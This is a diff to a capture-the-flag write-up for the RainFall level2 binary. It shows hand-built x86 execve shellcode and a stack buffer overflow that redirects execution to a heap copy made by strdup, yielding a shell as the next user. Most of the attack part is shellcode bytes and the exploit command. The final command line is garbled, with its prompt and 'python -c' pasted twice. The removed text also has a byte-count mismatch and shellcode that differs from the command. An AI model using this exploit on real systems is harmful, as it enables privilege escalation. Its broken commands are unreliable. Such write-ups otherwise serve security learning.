@@ -86,21 +86,46 @@ ltrace also shows us strdup always uses the address ```0x804a008```, this indica
 
 So let's try to write our malicious shellcode in the heap by writing it in the input prompt. Then write the strdup malloc address on the return address.
 
+### Build malicious code
+
+We can use syscall ```execve()``` to open a shell. Searching for unix syscalls in ```/usr/include/i386-linux-gnu/asm/unistd_32.h``` we find ```execve()``` is syscall 11.
+```
+level2@RainFall:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep "execve"
+#define __NR_execve		 11
+```
+Let's create the assembly code to open a shell, and break it down into bytecode.
+```
++----------------+-----------------------+-----------------------+----------------------------------------------+
+| Bytecode       | (Intermediate)        | Assembly              | Comments                                     |
++----------------+-----------------------+-----------------------+----------------------------------------------+
+| 31 d2          | xor    edx,edx        | xor   edx, edx        | execve 3rd parameter = envp, NULL            |
+| 31 c9          | xor    ecx,ecx        | xor   ecx, ecx        | execve 2nd parameter = argv, NULL            |
+| 51             | push   ecx            | push  ecx             |                                              |
+| 68 2f 2f 73 68 | push   0x68732f2f     | push  '//sh'          | after 3rd push instruction, stack contains:  |
+| 68 2f 62 69 6e | push   0x6e69622f     | push  '/bin'          | db '/bin//sh',0,0,0,0                        |
+| 31 c0          | xor    eax,eax        | xor   eax, eax        |                                              |
+| b0 0b          | mov    al,0xb         | mov   al, 11          | execve syscall                               |
+| 89 e3          | mov    ebx,esp        | mov   ebx, esp        | execve 1st parameter = executable (on stack) |
+| 83 e4 f0       | and    esp,0xfffffff0 | and   esp, 0xfffffff0 | align stack                                  |
+| cd 80          | int    0x80           | int   0x80            | syscall                                      |
++----------------+-----------------------+-----------------------+----------------------------------------------+
+```
+
+Lets create our malicious code string, sdding backslash \x to write as bytes.
+```
+\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80
+```
+
 ### Build exploit string
 
-Using [this compact system call opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php) we create our malicious bytecode.
-```
-\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
-```
-
 Lets create our exploit string:
-1. Our malicious bytecode (21 bytes) - ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80```
-2. Buffer until EIP offset at 80 bytes - ```"A" * 59```
+1. Our malicious bytecode (26 bytes) - ```\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80```
+2. Buffer until EIP offset at 80 bytes - ```"A" * 54```
 3. Address of our malicious code, copied by strdup() to the heap - ```\x08\xa0\x04\x08```
 
 Pipe the exploit string into ./level2 stdin. This opens a shell as user ```level3```, where we can cat the level3 password.
 ```
-level2@RainFall:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' ; cat -) | ./level2
+level2@RainFall:~$ (python -c 'print level2@RainFall:~$ (python -c 'print "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" + "A" * 54 + "\x08\xa0\x04\x08"' ; cat -) | ./level2
 ...
 whoami
 level3
